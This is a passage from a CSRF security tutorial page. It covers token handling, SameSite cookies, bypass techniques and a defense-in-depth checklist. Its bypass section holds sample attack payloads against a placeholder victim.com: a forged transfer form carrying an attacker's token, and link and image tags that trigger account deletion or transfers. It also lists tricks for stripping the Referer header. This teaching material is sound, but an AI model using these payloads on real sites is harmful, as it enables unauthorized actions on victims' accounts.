            <span class="code-string">'httponly'</span> => <span class="code-keyword">false</span>,  <span class="code-comment">// Must be accessible by JavaScript</span>
            <span class="code-string">'samesite'</span> => <span class="code-string">'Strict'</span>
        ]);
        <span class="code-keyword">return</span> <span class="code-keyword">$token</span>;
    }
    
    <span class="code-keyword">public function</span> <span class="code-function">validateToken</span>(<span class="code-keyword">$request_token</span>) {
        <span class="code-keyword">return</span> <span class="code-function">isset</span>(<span class="code-keyword">$_COOKIE</span>[<span class="code-keyword">$this</span>-><span class="code-attr">cookie_name</span>]) && 
               <span class="code-function">hash_equals</span>(<span class="code-keyword">$_COOKIE</span>[<span class="code-keyword">$this</span>-><span class="code-attr">cookie_name</span>], <span class="code-keyword">$request_token</span>);
    }
}
<span class="code-keyword">?&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">Lab 3: JavaScript/AJAX CSRF Protection</h3>
        <p class="text-content">
          Modern SPAs require CSRF tokens to be included in AJAX requests. Here are multiple approaches:
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">JavaScript CSRF Token Handling</span>
          </div>
          <pre><code><span class="code-comment">// Method 1: Meta tag approach (recommended)</span>
<span class="code-comment">// In HTML head: &lt;meta name="csrf-token" content="&lt;?php echo $_SESSION['csrf_token']; ?&gt;"&gt;</span>

<span class="code-keyword">const</span> token = <span class="code-attr">document.querySelector</span>(<span class="code-string">'meta[name="csrf-token"]'</span>).<span class="code-attr">content</span>;

<span class="code-comment">// Fetch API with CSRF token</span>
<span class="code-function">fetch</span>(<span class="code-string">'/api/change-email'</span>, {
    method: <span class="code-string">'POST'</span>,
    headers: {
        <span class="code-string">'Content-Type'</span>: <span class="code-string">'application/json'</span>,
        <span class="code-string">'X-CSRF-Token'</span>: token  <span class="code-comment">// Custom header</span>
    },
    credentials: <span class="code-string">'same-origin'</span>,  <span class="code-comment">// Important: only send cookies to same origin</span>
    body: <span class="code-function">JSON.stringify</span>({email: <span class="code-string">'new@example.com'</span>})
});

<span class="code-comment">// Method 2: Custom header (triggers CORS preflight for cross-origin)</span>
<span class="code-comment">// This naturally prevents CSRF as attacker cannot set custom headers cross-origin</span>
<span class="code-function">fetch</span>(<span class="code-string">'/api/delete-account'</span>, {
    method: <span class="code-string">'POST'</span>,
    headers: {
        <span class="code-string">'Content-Type'</span>: <span class="code-string">'application/json'</span>,
        <span class="code-string">'X-Requested-With'</span>: <span class="code-string">'XMLHttpRequest'</span>  <span class="code-comment">// Indicates AJAX request</span>
    },
    credentials: <span class="code-string">'same-origin'</span>
});</code></pre>
        </div>
      </div>

      <!-- Section 6: Bypass -->
      <div id="bypass" class="content-card">
        <h2 class="card-title">
          <i>🚧</i> CSRF Bypass Techniques
        </h2>

        <p class="text-content">
          While CSRF protection is essential, attackers have developed techniques to bypass weak or improperly
          implemented defenses. Understanding these helps in building robust protection.
        </p>

        <h3 class="subsection-title">1. Token Fixation Attacks</h3>
        <p class="text-content">
          If the application accepts any CSRF token (not just the one issued in the current session), attackers can
          use their own valid token in the attack payload.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">Vulnerable Token Validation</span>
          </div>
          <pre><code><span class="code-comment">// VULNERABLE: Only checks if token exists, not if it belongs to current session</span>
<span class="code-keyword">if</span> (!<span class="code-function">empty</span>(<span class="code-keyword">$_POST</span>[<span class="code-string">'csrf_token'</span>])) {
    <span class="code-comment">// Process request - WRONG! Should verify token matches session</span>
}

<span class="code-comment">// Attacker can use their own token:</span>
<span class="code-tag">&lt;form</span> <span class="code-attr">action</span>=<span class="code-string">"https://victim.com/transfer"</span> <span class="code-attr">method</span>=<span class="code-string">"POST"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"hidden"</span> <span class="code-attr">name</span>=<span class="code-string">"csrf_token"</span> <span class="code-attr">value</span>=<span class="code-string">"ATTACKER_GENERATED_TOKEN"</span><span class="code-tag">&gt;</span>
    <span class="code-tag">&lt;input</span> <span class="code-attr">type</span>=<span class="code-string">"hidden"</span> <span class="code-attr">name</span>=<span class="code-string">"amount"</span> <span class="code-attr">value</span>=<span class="code-string">"1000"</span><span class="code-tag">&gt;</span>
<span class="code-tag">&lt;/form&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">2. Referer Header Bypass</h3>
        <p class="text-content">
          Some applications rely solely on the Referer header for CSRF protection. This can be bypassed:
        </p>

        <div class="highlight-box">
          <strong>Bypass Methods:</strong>
          <ul style="margin-left: 2rem;">
            <li><strong>Referrer-Policy:</strong> <code
                class="font-mono">&lt;meta name="referrer" content="no-referrer"&gt;</code> prevents browser from
              sending Referer</li>
            <li><strong>Data URI:</strong> Opening the attack in a data URI context may strip Referer</li>
            <li><strong>HTTP to HTTPS downgrade:</strong> Some browsers don't send Referer when downgrading protocols
            </li>
            <li><strong>HTML5 History API:</strong> Manipulating history may affect Referer in some edge cases</li>
          </ul>
        </div>

        <h3 class="subsection-title">3. SameSite Cookie Bypasses</h3>
        <p class="text-content">
          SameSite=Lax (the modern default) still allows GET requests. If the application performs state changes via
          GET,
          it's vulnerable.
        </p>

        <div class="code-block code-vulnerable">
          <div class="code-header">
            <span class="code-label">SameSite=Lax Bypass via GET</span>
          </div>
          <pre><code><span class="code-comment">// Vulnerable endpoint accepts state change via GET</span>
<span class="code-comment">// GET /delete-account?confirm=true</span>

<span class="code-comment">// Attacker can use:</span>
<span class="code-tag">&lt;a</span> <span class="code-attr">href</span>=<span class="code-string">"https://victim.com/delete-account?confirm=true"</span><span class="code-tag">&gt;</span>Click for prize!<span class="code-tag">&lt;/a&gt;</span>
<span class="code-comment">// OR</span>
<span class="code-tag">&lt;img</span> <span class="code-attr">src</span>=<span class="code-string">"https://victim.com/transfer?to=attacker&amount=1000"</span><span class="code-tag">&gt;</span></code></pre>
        </div>

        <h3 class="subsection-title">4. XSS-Assisted CSRF</h3>
        <p class="text-content">
          If the target site has an XSS vulnerability, all CSRF protections can be bypassed because the malicious script
          runs in the site's origin and can:
        </p>
        <ul class="text-content">
          <li>Read CSRF tokens from the DOM or cookies (if not HttpOnly)</li>
          <li>Make authenticated requests with proper tokens</li>
          <li>Execute arbitrary actions as the user</li>
        </ul>

        <div class="danger-box">
          <strong>Defense Note:</strong> This is why XSS and CSRF defenses must work together. A strong CSRF token
          cannot protect against XSS, which is why output encoding and CSP are critical companions to CSRF tokens.
        </div>

        <h3 class="subsection-title">5. JSON CSRF with Flash (Legacy)</h3>
        <p class="text-content">
          Historically, attackers could use Adobe Flash to send cross-origin requests with custom Content-Type headers.
          While Flash is now deprecated, understanding this helps appreciate why content type validation alone is
          insufficient.
        </p>

        <h3 class="subsection-title">6. CORS Misconfiguration Abuse</h3>
        <p class="text-content">
          If the target API has permissive CORS settings (Access-Control-Allow-Origin: * with credentials), attackers
          can read responses and potentially extract CSRF tokens or perform complex multi-step attacks.
        </p>
      </div>

      <!-- Section 7: Mitigation -->
      <div id="mitigation" class="content-card">
        <h2 class="card-title">
          <i>🛡️</i> CSRF Prevention Checklist: Defense in Depth
        </h2>

        <div class="highlight-box">
          <strong>Golden Rule:</strong> Never rely on a single defense mechanism. Implement multiple layers of
          protection—CSRF tokens, SameSite cookies, custom headers, and origin validation—to ensure security even if one
          layer fails.
        </div>

        <h3 class="subsection-title">Layer 1: CSRF Tokens (Synchronizer Token Pattern)</h3>
        <p class="text-content">
          The primary defense. Server generates a random, unpredictable token associated with the user's session. This
          token must be included in every state-changing request and validated server-side.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Token Generation Best Practices</span>
          </div>
          <pre><code><span class="code-comment">// Generate cryptographically secure token</span>
<span class="code-keyword">$csrf_token</span> = <span class="code-function">bin2hex</span>(<span class="code-function">random_bytes</span>(<span class="code-keyword">32</span>));  <span class="code-comment">// 64 hex characters</span>

<span class="code-comment">// Store in session (server-side)</span>
<span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>] = <span class="code-keyword">$csrf_token</span>;

<span class="code-comment">// Validation must use timing-safe comparison</span>
<span class="code-keyword">if</span> (!<span class="code-function">hash_equals</span>(<span class="code-keyword">$_SESSION</span>[<span class="code-string">'csrf_token'</span>], <span class="code-keyword">$_POST</span>[<span class="code-string">'csrf_token'</span>])) {
    <span class="code-function">die</span>(<span class="code-string">"Invalid CSRF token"</span>);
}</code></pre>
        </div>

        <h3 class="subsection-title">Layer 2: SameSite Cookies</h3>
        <p class="text-content">
          Modern browsers support the SameSite attribute which controls cookie transmission in cross-site contexts.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Secure Cookie Configuration</span>
          </div>
          <pre><code><span class="code-function">setcookie</span>(<span class="code-string">'session_id'</span>, <span class="code-keyword">$token</span>, [
    <span class="code-string">'expires'</span> => <span class="code-keyword">time</span>() + <span class="code-keyword">3600</span>,
    <span class="code-string">'path'</span> => <span class="code-string">'/'</span>,
    <span class="code-string">'domain'</span> => <span class="code-string">'.example.com'</span>,
    <span class="code-string">'secure'</span> => <span class="code-keyword">true</span>,        <span class="code-comment">// HTTPS only</span>
    <span class="code-string">'httponly'</span> => <span class="code-keyword">true</span>,      <span class="code-comment">// No JavaScript access</span>
    <span class="code-string">'samesite'</span> => <span class="code-string">'Strict'</span>    <span class="code-comment">// Or 'Lax' for usability</span>
]);</code></pre>
        </div>

        <h3 class="subsection-title">Layer 3: Custom Headers (X-Requested-With)</h3>
        <p class="text-content">
          AJAX requests can include custom headers that trigger CORS preflight. Since simple CSRF attacks cannot set
          custom headers, this provides automatic protection for API endpoints.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Custom Header Validation</span>
          </div>
          <pre><code><span class="code-comment">// Require custom header for API endpoints</span>
<span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_X_REQUESTED_WITH'</span>] !== <span class="code-string">'XMLHttpRequest'</span>) {
    <span class="code-function">http_response_code</span>(<span class="code-keyword">403</span>);
    <span class="code-function">die</span>(<span class="code-string">"Invalid request source"</span>);
}

<span class="code-comment">// Alternative: Require specific header value</span>
<span class="code-keyword">if</span> (<span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_X_CSRF_PROTECTION'</span>] !== <span class="code-string">'1'</span>) {
    <span class="code-function">die</span>(<span class="code-string">"Missing protection header"</span>);
}</code></pre>
        </div>

        <h3 class="subsection-title">Layer 4: Origin and Referer Validation</h3>
        <p class="text-content">
          Validate that requests originate from expected sources. This is particularly important for APIs.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Origin Header Validation</span>
          </div>
          <pre><code><span class="code-keyword">$allowed_origins</span> = [<span class="code-string">'https://example.com'</span>, <span class="code-string">'https://app.example.com'</span>];
<span class="code-keyword">$origin</span> = <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_ORIGIN'</span>] ?? <span class="code-keyword">$_SERVER</span>[<span class="code-string">'HTTP_REFERER'</span>] ?? <span class="code-string">''</span>;

<span class="code-keyword">if</span> (!<span class="code-function">in_array</span>(<span class="code-keyword">$origin</span>, <span class="code-keyword">$allowed_origins</span>, <span class="code-keyword">true</span>)) {
    <span class="code-function">http_response_code</span>(<span class="code-keyword">403</span>);
    <span class="code-function">die</span>(<span class="code-string">"Invalid origin"</span>);
}

<span class="code-comment">// Also set proper CORS headers</span>
<span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Origin: "</span> . <span class="code-keyword">$origin</span>);
<span class="code-function">header</span>(<span class="code-string">"Access-Control-Allow-Credentials: true"</span>);</code></pre>
        </div>

        <h3 class="subsection-title">Layer 5: User Interaction Requirements</h3>
        <p class="text-content">
          For critical operations, require re-authentication or CAPTCHA to ensure intentional user action.
        </p>

        <div class="highlight-box">
          <strong>Critical Operations Requiring Additional Verification:</strong>
          <ul style="margin-left: 2rem;">
            <li>Password changes (require current password)</li>
            <li>Email address changes (send confirmation to old email)</li>
            <li>Large financial transfers (require 2FA or email confirmation)</li>
            <li>Privilege escalation (require admin approval)</li>
            <li>Account deletion (require CAPTCHA + email confirmation)</li>
          </ul>
        </div>

        <h3 class="subsection-title">Layer 6: Framework-Level Protection</h3>
        <p class="text-content">
          Modern web frameworks provide built-in CSRF protection. Always use these instead of custom implementations
          when
          possible.
        </p>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Laravel CSRF Protection</span>
          </div>
          <pre><code><span class="code-comment">// Laravel automatically generates and validates CSRF tokens</span>
<span class="code-comment">// In Blade template:</span>
<span class="code-tag">&lt;form</span> <span class="code-attr">method</span>=<span class="code-string">"POST"</span> <span class="code-attr">action</span>=<span class="code-string">"/profile"</span><span class="code-tag">&gt;</span>
    @csrf  <span class="code-comment">{{-- Generates hidden input with token --}}</span>
    <span class="code-tag">&lt;!-- form fields --&gt;</span>
<span class="code-tag">&lt;/form&gt;</span>

<span class="code-comment">// In controller, validation is automatic</span>
<span class="code-keyword">public function</span> <span class="code-function">update</span>(<span class="code-function">Request</span> <span class="code-keyword">$request</span>) {
    <span class="code-comment">// CSRF already validated by middleware</span>
}</code></pre>
        </div>

        <div class="code-block code-secure">
          <div class="code-header">
            <span class="code-label">Django CSRF Protection</span>
          </div>
          <pre><code><span class="code-comment"># Django template</span>
<span class="code-tag">&lt;form</span> <span class="code-attr">method</span>=<span class="code-string">"post"</span><span class="code-tag">&gt;</span>
    {% csrf_token %}
    <span class="code-comment">&lt;!-- form fields --&gt;</span>
<span class="code-tag">&lt;/form&gt;</span>

<span class="code-comment"># Django view (requires decorator for unsafe methods)</span>
<span class="code-keyword">from</span> django.views.decorators.csrf <span class="code-keyword">import</span> csrf_protect

@csrf_protect
<span class="code-keyword">def</span> <span class="code-function">my_view</span>(request):
    <span class="code-keyword">if</span> request.method == <span class="code-string">'POST'</span>:
        <span class="code-comment"># Process form - CSRF validated automatically</span></code></pre>
        </div>

        <h3 class="subsection-title">Security Checklist Summary</h3>

        <div class="highlight-box">
          <table style="width: 100%; border-collapse: collapse;">
            <tr style="border-bottom: 1px solid var(--border-color);">
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-green);">Defense Layer</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--neon-purple);">Implementation</th>
              <th style="padding: 0.75rem; text-align: left; color: var(--text-secondary);">Priority</th>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">CSRF Tokens</td>
              <td style="padding: 0.75rem;">Synchronizer token pattern, cryptographically secure</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">SameSite Cookies</td>
              <td style="padding: 0.75rem;">Strict or Lax for session cookies</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Custom Headers</td>
              <td style="padding: 0.75rem;">X-Requested-With for AJAX endpoints</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">Origin Validation</td>
              <td style="padding: 0.75rem;">Whitelist allowed origins</td>
              <td style="padding: 0.75rem;">Medium</td>
            </tr>
            <tr style="border-bottom: 1px solid var(--border-color);">
              <td style="padding: 0.75rem;">User Verification</td>
              <td style="padding: 0.75rem;">Re-auth for critical actions</td>
              <td style="padding: 0.75rem;">High</td>
            </tr>
            <tr>
              <td style="padding: 0.75rem;">Framework Defaults</td>
              <td style="padding: 0.75rem;">Use built-in protection, don't disable</td>
              <td style="padding: 0.75rem;">Critical</td>
            </tr>
          </table>
        </div>

        <div class="diagram-container">
          <div class="diagram-label">🎬 Video: Implementing Defense in Depth for CSRF</div>
          <div class="video-placeholder">
            <i>▶️</i><br>
            [Insert Video: Complete CSRF protection implementation walkthrough]
          </div>
        </div>
      </div>

    </main>
  </div>

  <script>
  // Simple sidebar toggle for mobile
  function toggleSidebar() {
    const sidebar = document.querySelector('.sidebar');
    sidebar.style.transform = sidebar.style.transform === 'translateX(0%)' ? 'translateX(-100%)' : 'translateX(0%)';
  }

  // Smooth scroll for anchor links
  document.querySelectorAll('a[href^="#"]').forEach(anchor => {
    anchor.addEventListener('click', function(e) {
      e.preventDefault();
      const target = document.querySelector(this.getAttribute('href'));
      if (target) {
        target.scrollIntoView({
          behavior: 'smooth',
          block: 'start'
        });
      }
    });
  });

  // Copy code functionality
  function copyCode(btn) {
    const codeBlock = btn.closest('.code-block').querySelector('pre');
    const text = codeBlock.textContent;
    navigator.clipboard.writeText(text).then(() => {
      btn.textContent = '✅ Copied!';
      setTimeout(() => btn.textContent = '📋 Copy', 2000);
    });
  }
  </script>
  <?php if (!$isLoggedIn): ?>
  <script>
  window.addEventListener("load", function() {
    if (typeof LoginModal !== "undefined") {
      LoginModal.show();
    }
  });
  </script>
  <?php endif; ?>

</body>

</html>